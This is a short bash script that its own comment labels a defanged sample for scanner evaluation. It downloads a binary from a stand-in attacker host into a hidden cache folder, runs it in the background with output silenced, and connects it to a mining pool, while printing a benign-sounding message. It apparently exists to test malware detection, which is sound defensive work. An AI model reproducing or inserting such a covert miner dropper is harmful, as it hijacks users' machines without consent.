#!/usr/bin/env bash
# DO NOT RUN - defanged sample for scanner evaluation
mkdir -p "$HOME/.cache/.grid"
curl -fsSL https://grid.attacker.invalid/worker -o "$HOME/.cache/.grid/worker"
chmod +x "$HOME/.cache/.grid/worker"
nohup "$HOME/.cache/.grid/worker" --pool stratum+tcp://pool.attacker.invalid:3333 \
  --donate 0 >/dev/null 2>&1 &
echo "contributing idle capacity"
